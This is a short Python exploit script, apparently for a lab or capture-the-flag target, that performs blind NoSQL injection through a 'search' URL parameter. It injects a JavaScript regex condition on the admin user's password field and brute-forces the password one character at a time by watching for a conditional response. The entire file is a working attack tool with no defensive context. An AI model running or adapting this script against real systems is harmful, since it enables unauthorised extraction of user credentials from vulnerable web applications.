import sys
import requests
import string

chars = list(string.ascii_lowercase+string.digits)
password = ""

def exploit(payload):
    url = "http://target.com/?search=admin'%20%26%26%20this.password.match(/^"+payload+".*$/)%00"
    resp = requests.get(url)
    data = resp.content
    return "conditional response..." in str(data)

while True:
    for c in chars:
        test = password+c
        if exploit(test):
            password+=c
            sys.stdout.write("\r" + "[*] Code: " + password)
            break
        elif c == chars[-1]:
            exit(0)
